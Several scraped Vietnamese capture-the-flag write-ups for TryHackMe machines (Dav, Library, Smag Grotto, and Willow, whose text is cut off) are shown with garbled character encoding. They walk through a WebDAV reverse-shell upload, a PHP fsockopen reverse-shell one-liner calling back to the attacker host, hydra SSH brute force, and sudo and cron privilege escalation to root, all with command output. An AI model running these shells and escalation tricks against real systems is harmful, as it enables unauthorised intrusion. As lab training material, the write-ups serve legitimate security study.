TÃ´i sáº½ thá»­ Ä‘áº©y reverse shell lÃªn Ä‘Ã¢y\ndav:/webdav/\u0026gt; put reshell.php Uploading reshell.php to `/webdav/reshell.php\u0026#39;: Progress: [=============================\u0026gt;] 100.0% of 2586 bytes succeeded. dav:/webdav/\u0026gt; Táº¡o listener vá»›i port 2402 - port Ä‘Ã£ cáº¥u hÃ¬nh bÃªn trong file shell.\nnc -nlvp 2402\nBÃ¢y giá» thÃ¬ thá»­ truy cáº­p shell vá»«a táº¡o\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.115.69] 50358 Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 03:17:08 up 1:06, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (690): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/$ TÃ´i tÃ¬m Ä‘Æ°á»£c user flag trong thÆ° má»¥c user merlin\nwww-data@ubuntu:/$ ls -la /home ls -la /home total 16 drwxr-xr-x 4 root root 4096 Aug 25 2019 . drwxr-xr-x 22 root root 4096 Aug 25 2019 .. drwxr-xr-x 4 merlin merlin 4096 Aug 25 2019 merlin drwxr-xr-x 2 wampp wampp 4096 Aug 25 2019 wampp www-data@ubuntu:/$ cd /home/merlin cd /home/merlin www-data@ubuntu:/home/merlin$ ls ls user.txt www-data@ubuntu:/home/merlin$ Privilege escalation # sudo -l\nwww-data@ubuntu:/home/merlin$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat www-data@ubuntu:/home/merlin$ cat | GTFOBins:\nwww-data@ubuntu:/home/merlin$ LFILE=/root/root.txt LFILE=/root/root.txt www-data@ubuntu:/home/merlin$ sudo cat \u0026#34;$LFILE\u0026#34; sudo cat \u0026#34;$LFILE\u0026#34; 1011***********************7afa5 www-data@ubuntu:/home/merlin$ ","date":"16 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/dav/","section":"Ctf","summary":"","title":"Tryhackme - Dav","type":"ctf"},{"content":"","date":"16 March 2022","externalUrl":null,"permalink":"/tags/webdav/","section":"Tags","summary":"","title":"Webdav","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Library\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c42fc34767063204ef92918e0587d5dc (RSA) | 256 689213ec9479dcbb7702da99bfb69db0 (ECDSA) |_ 256 43e824fcd8b8d3aac248089751dc5b7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to Blog - Library Machine | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Xem qua web vá»›i port 80\nTÃ´i cÃ³ 1 cÃ¡i tÃªn á»Ÿ Ä‘Ã¢y meliodas. Khi scan port phÃ­a trÃªn tÃ´i cÅ©ng cÃ³ 1 path lÃ  robots.txt\nNgay khi nhÃ¬n tháº¥y rockyou thÃ¬ tÃ´i nghÄ© ngay Ä‘áº¿n brute-force (thá»±c ra thÃ¬ ai cÅ©ng nghÄ© Ä‘áº¿n thÃ´i). TÃ´i sáº½ thá»­ brute-force vá»›i username meliodas\nâ”Œâ”€â”€(neoã‰¿kali)-[~/THM-Library] â””â”€$ hydra -l meliodas -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt ssh://10.10.192.105 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-04 04:33:05 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 42660 login tries (l:1/p:42660), ~2667 tries per task [DATA] attacking ssh://10.10.192.105:22/ [STATUS] 128.00 tries/min, 128 tries in 00:01h, 42534 to do in 05:33h, 14 active [22][ssh] host: 10.10.192.105 login: meliodas password: iloveyou1 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 3 final worker threads did not complete until end. [ERROR] 3 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-04 04:35:35 Thá»­ login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~/THM-Library] â””â”€$ ssh meliodas@10.10.192.105 The authenticity of host \u0026#39;10.10.192.105 (10.10.192.105)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.192.105\u0026#39; (ED25519) to the list of known hosts. meliodas@10.10.192.105\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118 meliodas@ubuntu:~$ ls bak.py user.txt meliodas@ubuntu:~$ Privilege escalation # sudo -l\nmeliodas@ubuntu:~$ sudo -l Matching Defaults entries for meliodas on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User meliodas may run the following commands on ubuntu: (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py meliodas@ubuntu:~$ cat bak.py\nmeliodas@ubuntu:~$ cat bak.py #!/usr/bin/env python import os import zipfile def zipdir(path, ziph): for root, dirs, files in os.walk(path): for file in files: ziph.write(os.path.join(root, file)) if __name__ == \u0026#39;__main__\u0026#39;: zipf = zipfile.ZipFile(\u0026#39;/var/backups/website.zip\u0026#39;, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) zipdir(\u0026#39;/var/www/html\u0026#39;, zipf) zipf.close() meliodas@ubuntu:~$ Do file nÃ y sá»Ÿ há»¯u bá»Ÿi root nÃªn tÃ´i khÃ´ng cÃ³ quyá»n sá»­a file nÃ y. TÃ´i sáº½ xÃ³a nÃ³ Ä‘i vÃ  táº¡o 1 file bak.py khÃ¡c chÆ°a payload python Ä‘á»ƒ leo quyá»n.\nmeliodas@ubuntu:~$ rm /home/meliodas/bak.py meliodas@ubuntu:~$ echo \u0026#39;import os;os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; /home/meliodas/bak.py meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py root@ubuntu:~# root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~# ls /root/ root.txt root@ubuntu:~# ","date":"15 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/library/","section":"Ctf","summary":"","title":"Tryhackme - Library","type":"ctf"},{"content":"","date":"12 March 2022","externalUrl":null,"permalink":"/tags/apt-get/","section":"Tags","summary":"","title":"Apt-Get","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i 1 Easy CTF Tryhackme - Smag Grotto\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 74e0e1b405856a15687e16daf2c76bee (RSA) | 256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA) |_ 256 f9e7da078f10af970b3287c932d71b76 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Smag Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ngáº¯m nghÃ­a qua web trÃªn port 80, tÃ´i cÃ³ 1 trang default vá»›i ná»™i dung trang web Ä‘ang Ä‘Æ°á»£c phÃ¡t triá»ƒn, quay trá»Ÿ láº¡i sau. Sau khi thá»­ 1 vÃ i path phá»• biáº¿n thÃ¬ tÃ´i biáº¿t Ä‘Æ°á»£c Ä‘Ã¢y lÃ  1 trang php vá»›i \u0026ldquo;index.php\u0026rdquo;. Thá»­ dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m web path\n[22:04:57] 200 - 402B - /index.php [22:04:58] 200 - 402B - /index.php/login/ [22:05:07] 200 - 2KB - /mail/ [22:05:08] 301 - 311B - /mail -\u0026gt; http://10.10.67.154/mail/ Vá»›i path /mail/ tÃ´i cÃ³ 1 Ä‘oáº¡n há»™i thoáº¡i vá»›i 3 ngÆ°á»i qua mail\nTÃ´i cÃ³ thÃªm 1 file pcap ná»¯a á»Ÿ Ä‘Ã¢y, táº£i nÃ³ vá» vÃ  phÃ¢n tÃ­ch\nVáº­y lÃ  tÃ´i pháº£i thÃªm domain vÃ o file hosts vÃ  sau Ä‘Ã³ cÃ³ thá»ƒ Ä‘Äƒng nháº­p vá»›i username vÃ  password.\nTÃ´i cÅ©ng khÃ´ng biáº¿t command nÃ y theo format gÃ¬, thá»­ cÃ¡c lá»‡nh cá»§a linux hay windows Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£.\nKhi kiá»ƒm tra source web tÃ´i cÃ²n phÃ¡t hiá»‡n 1 Ä‘á»‹a chá»‰ mail bá»‹ áº©n nhÆ°ng hiá»‡n táº¡i cÅ©ng chÆ°a Ä‘á»ƒ lÃ m gÃ¬\ntrodd@smag.thm\nCÃ³ thá»ƒ Ä‘Ã¢y lÃ  username nÃªn bá»‹ áº©n Ä‘i. TÃ´i khÃ´ng cháº¯c nÃªn sáº½ quay láº¡i sau\n\u0026lt;a href=\u0026#34;[../aW1wb3J0YW50/dHJhY2Uy.pcap](view-source:http://10.10.67.154/aW1wb3J0YW50/dHJhY2Uy.pcap)\u0026#34;\u0026gt;dHJhY2Uy.pcap\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-action\u0026#34;\u0026gt; \u0026lt;a\u0026gt;To: netadmin@smag.thm\u0026lt;/a\u0026gt; \u0026lt;a\u0026gt;Cc: uzi@smag.thm\u0026lt;/a\u0026gt; \u0026lt;!-- \u0026lt;a\u0026gt;Bcc: trodd@smag.thm\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;a\u0026gt;From: jake@smag.thm\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; TrÆ°á»›c file pcap vá»«a rá»“i lÃ  1 path khÃ¡c, thá»­ truy cáº­p vÃ o path nÃ y nhÆ°ng cÅ©ng chá»‰ cÃ³ file pcap. Trong trang default cá»§a path /mail cÃ³ 1 dÃ²ng note ráº±ng tÃ´i cÃ³ thá»ƒ download cÃ¡c file báº±ng wget, váº­y nÃªn tÃ´i sáº½ thá»­ upload shell lÃªn server báº±ng cÃ¡ch táº£i nÃ³ tá»« mÃ¡y local cá»§a mÃ¬nh\nTáº¡o local http server\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Sau Ä‘Ã³ nháº­p cÃ¢u lá»‡nh vÃ o pháº§n command\nwget http://10.18.3.74:8000/shell.php\nQuay trá»Ÿ láº¡i local machine tÃ´i tháº¥y file Ä‘Ã£ Ä‘Æ°á»£c táº£i lÃªn nhÆ°ng khÃ´ng thá»ƒ tÃ¬m Ä‘Æ°á»£c file Ä‘á»ƒ má»Ÿ máº·c dÃ¹ Ä‘Ã£ thá»­ cÃ¡c url khÃ¡c nhau, táº¥t nhiÃªn lÃ  trÆ°á»›c Ä‘Ã³ tÃ´i Ä‘Ã£ táº¡o listener vá»›i port 2402: nc -lnvp 2402\nSau 1 lÃºc suy nghÄ© tÃ´i tá»± há»i sao khÃ´ng thá»­ luÃ´n shell php trÃªn command nÃ y.\nphp -r '$sock=fsockopen(\u0026quot;10.6.0.191\u0026quot;,2402);exec(\u0026quot;/bin/bash \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.67.154] 49698 id uid=33(www-data) gid=33(www-data) groups=33(www-data) Váº­y lÃ  tÃ´i Ä‘Ã£ quÃ¡ phá»©c táº¡p váº¥n Ä‘á» lÃªn rá»“i \u0026#x1f615; Config láº¡i shell vá»›i python. xem qua file \u0026ldquo;passwd\u0026rdquo; thÃ¬ tÃ´i cÃ³ 1 user khÃ¡c vá»›i tÃªn jake, sau khi thá»­ cÃ¡c phÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n thÃ¬ tÃ´i tÃ¬m tháº¥y vÃ i thá»© hay ho vá»›i cronjob\nwww-data@smag:/$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup \u0026gt; /home/jake/.ssh/authorized_keys # www-data@smag:/$ File public key sáº½ Ä‘Æ°á»£c Ä‘á»c vÃ  ghi vÃ o ssh key cá»§a jake\nwww-data@smag:/$ cat /opt/.backups/jake_id_rsa.pub.backup cat /opt/.backups/jake_id_rsa.pub.backup ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali www-data@smag:/$ TÃ´i cÃ³ thá»ƒ xÃ¡c thá»±c ssh báº±ng cÃ¡ch thay Ä‘á»•i public key nÃ y thÃ nh public key cá»§a tÃ´i.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat .ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRyZarVKQLIN+BlzvSNzD9mMuF43Vfju/5TWxCxz7y67on3Ds/0oagsp6H0cDIiuYpyWfc4tAXlT21V+wVSqyzheHoWIFLCdC4aj1jrN+2+DYa5cwn56xzkya7jKImTUuE7oePcabooMUyQZlKwNUjjgdaswaTgv5MGbRnWsM6FJnMeir3esFgKy9cipQqLJh/aJP1LZ0YKfJb8vy3/hO3WdCC3MGir6cnk7Oznc6QkMm7e2Nk9deBLHoQY86BVN5KRbV9HX6rBFaV93MAScjTLsqyUB3YXX05K+parkr7Lx4HUS0ptwWOkKluaAbBPZ/+nnzirKBFNddW7rW4WsuL4glJDAIM9YJefQmsylPrn/wLOvZikpcLkoYDc1h2dWjG43xO7wWCfyQo3QtercMwfcA+r/qiQpuy+qwXi4nh0XHAxFcDlL2u0aAsf3jvQZk6DKUSHuHL9v5KIwZi6HkotqwRa2/v7SL0G8I9YKK/WCSzCj8iVIoHLm0YhBy/Zt0= neo@kali â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ÄÃ¢y lÃ  public key cá»§a tÃ´i, ghi Ä‘Ã¨ nÃ³ vÃ o file backup cá»§a jake\nwww-data@smag:/home$ echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRyZarVKQLIN+BlzvSNzD9mMuF43Vfju/5TWxCxz7y67on3Ds/0oagsp6H0cDIiuYpyWfc4tAXlT21V+wVSqyzheHoWIFLCdC4aj1jrN+2+DYa5cwn56xzkya7jKImTUuE7oePcabooMUyQZlKwNUjjgdaswaTgv5MGbRnWsM6FJnMeir3esFgKy9cipQqLJh/aJP1LZ0YKfJb8vy3/hO3WdCC3MGir6cnk7Oznc6QkMm7e2Nk9deBLHoQY86BVN5KRbV9HX6rBFaV93MAScjTLsqyUB3YXX05K+parkr7Lx4HUS0ptwWOkKluaAbBPZ/+nnzirKBFNddW7rW4WsuL4glJDAIM9YJefQmsylPrn/wLOvZikpcLkoYDc1h2dWjG43xO7wWCfyQo3QtercMwfcA+r/qiQpuy+qwXi4nh0XHAxFcDlL2u0aAsf3jvQZk6DKUSHuHL9v5KIwZi6HkotqwRa2/v7SL0G8I9YKK/WCSzCj8iVIoHLm0YhBy/Zt0= neo@kali\u0026#34; \u0026gt; /opt/.backups/jake_id_rsa.pub.backup www-data@smag:/home$ Thá»­ login láº¡i ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh jake@10.10.223.144 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Fri Jun 5 10:15:15 2020 jake@smag:~$ id uid=1000(jake) gid=1000(jake) groups=1000(jake),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1001(netadmin) jake@smag:~$ ls user.txt jake@smag:~$ Privilege escalation # sudo -l\njake@smag:~$ sudo -l Matching Defaults entries for jake on smag: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on smag: (ALL : ALL) NOPASSWD: /usr/bin/apt-get jake@smag:~$ GTFOBins\njake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh # id uid=0(root) gid=0(root) groups=0(root) # ls /root root.txt # ","date":"12 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/smag-grotto/","section":"Ctf","summary":"","title":"Tryhackme - Smag Grotto","type":"ctf"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Willow\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA) | 2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA) | 256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA) |_ 256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Recovery Page |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000) 2049/tcp open nfs 2-4 (RPC #100003) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Xem qua web xem cÃ³ gÃ¬ Ä‘áº·c biá»‡t khÃ´ng\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Recovery Page\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body{ word-wrap: break-word; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; 4865792057696c6c6f772c2068657265277320796f7572205353482050726976617465206b6579202d2d20796f75206b6e6f77207768657265207468652064656372797074696f6e206b6579206973210a32333637203233363720323336372032333637203233363720393730392038363030203238363338203138343130203137333520333330323920313631383620323833373420333732343820333330323920323638343220313631383620313834313020323332313920333732343820313133333920383630302033333032392033353637302038363030203331313331203233363720323336372032333637203233363720323336372031343432322032363834322039343530203134363035203139323736203233363720313133333920333330303620333635303020343139382033333738312033333032392031313430352035323637203836303020313733352031373633322031363138362033313133312032363834322031313333392038363030203335373334203134343232203335373334203836303020333536373020323336372031383431302033353234332033373433382031343630352033333738312033333032392033373234382038363030203238333734203233363720323231343920323735383220333037382032333637203137363332203937303920313736333220353236372032373538322038363030203237353832203233373231203131343035203133323536203333393835203337323438203138323738203333393835203237353832203236373735203233373231203236373735203237353832203232313439203330373820333037382039373039203131343035203333393835203138323738203137363332203337323438203337323438203333343433203836303020313832373820313832373820323735383220313833333020313332353620313434323220313434323220323830363120313033383620323332313920313033383620333333392032353131312032323035332032313838392033313133312033333835362033333339203136313836203238303631203734393620313436303520323231343920353835312033353234332031313333392033333938352033353234332032323837322033333434332033333835362033333434332032323134392033333835362038343532203131333339203735363820323230353320323231343920333934372032393630392039373039203335323433203538353120313134303520313831393920313332353620333332313520333339383520373536382033333231352031323234342035343434203232303533203134363035203130333836203734393620333332313520333333392039373039203130333836203231383839203834353220323830363120323833373420383439392031323739322031383139392032303137322031393237362038343939203134343232203232313032203139333936203132323434203238303631203233373231203834353220323735383220353835312031393237362032383337342031323234342032333732312032363737352032383337342031383139392033353234332031333235362032383932372032333231392033353234332033353733342033333339203333323135203333333920323231343920333635303020313436303520323134303420323735383220313733352033353234332032383633382031323739322037343936203237353832203238303631203333383536203333383536203238393237203735363820313133333920333734333820333734333820383435322033303738203238333734203238363338203333333920393730392032383932372032383633382033353234332031393237362033353733342034313938203739313420313832373820383630302033373234382039373039203138313939203139323736203230313732203232313439203134343232203534343420313133333920373439362031323739322032383633382037353638203138313939203239363535203335323433203231383839203138313939203132373932203230313732203331313331203231343034203230313732203337323438203333343433203232303533203231383839203131333339203733353820313133333920323138383920323531313120353835312031373633322032313430342038343939203132323434203237353832203231383839203734393620333734333820333732343820323138383920333537333420333332313520313232343420383439392032333231392031383139392031323739322033313133312033353637302031323234342032383633382033373234382032383932372032383337342031373335203431393820313933393620383630302038363030203237353832203137363332203230313732203233323139203239363039203237353832203834393920323637373520323735383220313434323220313332353620313831393920393730392032393630392031373335203836303020323031373220323836333820373536382032383932372033353733342038363030203138343130203333333920373439362031393237362033303738203232313439203239363535203138323738203138323738203137363332203331313331203735363820333131333120373335382031313430352039343530203834353220323230353320393435302031333235362033333835362037393134203834353220333635303020313736333220373335382033393437203333323135203238363338203131333339203138323738203335373334203238333734203233373231203131333339203534343420323936303920323735383220313736333220333332313520323238373220323138383920313831393920333037382031313333392031373633322035343434203333303036203834353220323833373420333332313520383439392031343432322032383337342033333835362031323234342033353637302032323134392031303338362033363530302032323130322031323234342037353638203534343420313134303520323637373520313332353620313133333920333131333120323031373220323935302037333538203136313836203231383839203333323135203333333920383439392037353638203233323139203232303533203335363730203333303036203239363535203232383732203233373231203233373837203335323433203236383432203735363820323637373520313933393620313232343420313933393620333934372032373538322031303338362037343936203237353832203335373334203333323135203534343420333338353620323936353520323031373220313232343420313436303520323531313120323935302032333738372038343939203238303631203339343720323134303420313831393920333131333120373335382031383333302031343432322032383036312033303738203231383839203232383732203238393237203333393835203133323536203333343433203335373334203834393920333732343820383439392032323130322031383237382031393339362033333938352039343530203236373735203238333734203131333339203134363035203331313331203232383732203132373932203235313131203834393920373931342031383431302032383036312032353131312032333231392038363030203333323135203232313439203131343035203333393835203937303920323935302037333538203137363332203238333734203131333339203138313939203834393920373335382033333231352031323234342032373538322031383139392031343630352032323130322032383337342037333538203339343720323638343220323735383220383630302031383139392038363030203138333330203237353832203138333330203238393237203232303533203134343232203232303533203232303533203333343433203333303036203538353120313133333920333536373020333332313520313831393920323138383920333330303620333131333120323735383220333333392037393134203734393620313332353620323637373520333131333120373439362032363737352033353637302031393237362033393437203233373231203331313331203339343720333330303620333635303020323637373520313933393620313237393220353434342031313333392037333538203137363332203734393620313436303520333635303020323836333820383435322033353637302032313838392032323134392031393237362033333835362037353638203431393820333037382033373234382031323234342033333938352038343532203138333330203937303920373335382039373039203138333330203232313032203235313131203733353820313033383620373931342037333538203134343232203331313331203136313836203330373820323637373520323231343920313733352032313838392039373039203138323738203138343130203138343130203239363535203538353120313831393920323638343220323230353320323833373420313933393620333334343320323138383920323238373220323638343220373439362031313333392038343939203232313032203333393835203238393237203538353120333635303020313436303520323839323720333131333120333635303020323638343220323836333820323936303920323833373420313232343420393730392031373335203733353820333732343820323231303220333339383520323332313920313733352032333231392033353637302033333030362034313938203136313836203239363039203232303533203238303631203337343338203733353820323230353320383435322032363834322031383333302037393134203335363730203236383432203134343232203239363535203330373820353835312038363030203231343034203333323135203136313836203538353120323936353520313736333220323735383220333537333420333536373020323337383720313832373820333536373020323238373220353835312032313430342038343532203333333920323031373220313832373820373439362037333538203336353030203139333936203333303036203137363332203130333836203130333836203834353220323836333820323936303920393730392032323035332033393437203237353832203236373735203231383839203232313439203337323438203734393620313833333020333037382037353638203138313939203132373932203733353820333734333820333635303020333635303020333734333820323231343920313832373820333131333120313933393620323231343920313832373820333332313520333934372033353637302031383333302033353637302031343432322031303338362038343532203335323433203337343338203330373820323839323720313933393620333732343820313733352033333938352032323134392032313430342032393630392032393635352034313938203337343338203238333734203335373334203134363035203836303020313736333220313832373820373439362032383633382039373039203431393820313232343420323531313120383435322038343532203232313439203138333330203233323139203131333339203139333936203335323433203233373837203339343720323735383220323231343920333338353620373536382038363030203138333330203333343433203134363035203333323135203137333520323936303920323637373520333734333820343139382033393437203138313939203138333330203331313331203330373820313736333220333635303020333334343320393730392033353637302038343532203131343035203134343232203238363338203538353120333532343320333131333120313033383620333338353620383435322031313430352033353733342033333339203339343720313932373620323830363120323836333820383630302032333732312039343530203231383839203238363338203138313939203233323139203137333520313831393920323134303420333333392031313430352035383531203836303020323231343920313133333920323833373420313834313020333934372031333235362039343530203131343035203232383732203337343338203431393820353835312031323234342031383139392032323035332039343530203138323738203231383839203138343130203138313939203431393820313133333920323230353320323332313920313834313020333339383520323735383220323638343220323238373220323531313120313736333220343139382031383139392032383337342031393339362031323234342031343432322031323234342033333231352033393437203237353832203132323434203238333734203132323434203232383732203836303020313733352035343434203238333734203232303533203138323738203735363820313436303520383439392032313430342032313430342032333738372033333835362031383139392039343530203131343035203335373334203238333734203230313732203239363039203238303631203130333836203138343130203335323433203238303631203239363039203236373735203339343720333339383520333934372037353638203538353120353835312035343434203231383839203335373334203934353020313933393620323839323720383630302031383139392031343630352031383139392034313938203138323738203331313331203333303036203233323139203834353220333339383520333333392032333231392033333835362033333434332035383531203431393820313434323220313832373820313832373820333330303620383435322032393530203139333936203333323135203230313732203333323135203138343130203333343433203333383536203238333734203331313331203331313331203137333520313733352033373433382033333339203339343720333037382031303338362033393437203232313439203431393820343139382032313838392032373538322031383139392037353638203333333920383439392031343630352037353638203230313732203132323434203333393835203138333330203139323736203239353020313933393620323337383720333332313520373439362033333434332032313838392038363030203239353020333333392032323837322033353234332038363030203139323736203233373231203836303020313232343420313833333020313134303520313733352032313430342035343434203333333920323138383920313834313020313434323220333537333420313831393920383630302032303137322032333231392031373335203138313939203233373231203238363338203331313331203231383839203239363039203237353832203735363820323031373220313736333220333333392031343630352032383633382031323234342031333235362031393339362033333231352032333231392033303738203139323736203230313732203233323139203131333339203238333734203335373334203834393920373439362031323234342031373335203333333920333339383520333734333820333934372032393630392031383237382031323234342037333538203239363535203137333520313832373820333732343820383435322037333538203137333520313832373820373439362033333339203333383536203238303631203834393920313133333920333732343820323638343220323337383720333